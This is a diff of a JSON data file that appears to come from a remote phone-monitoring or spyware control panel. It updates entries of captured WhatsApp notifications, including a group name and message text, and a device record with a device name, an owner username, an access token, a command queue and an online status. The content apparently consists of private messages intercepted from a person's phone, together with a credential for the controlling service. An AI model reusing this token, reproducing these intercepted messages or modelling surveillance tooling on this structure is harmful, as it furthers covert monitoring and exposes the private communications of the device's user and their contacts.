@@ -22,6 +22,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3059 pesan dari 19 chat",
+        "time": "29/04 15:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777448045466
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎GB || ISIAN  LYEZ STORE X ALL OWN (18 pesan): ~ sarol 412",
         "content": "wkwk",
         "time": "29/04 15:45",
@@ -4011,14 +4019,6 @@
         "time": "29/04 14:24",
         "pkg": "com.whatsapp",
         "receivedAt": 1777443203158
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎2098 pesan dari 19 chat",
-        "time": "29/04 14:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777443203137
       }
     ],
     "galleryPhotos": [],
@@ -17526,7 +17526,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "47026291789bab18fbcb5d300d789adf",
-    "lastSeen": 1777448043800,
+    "lastSeen": 1777448052743,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T07:32:36.802Z",
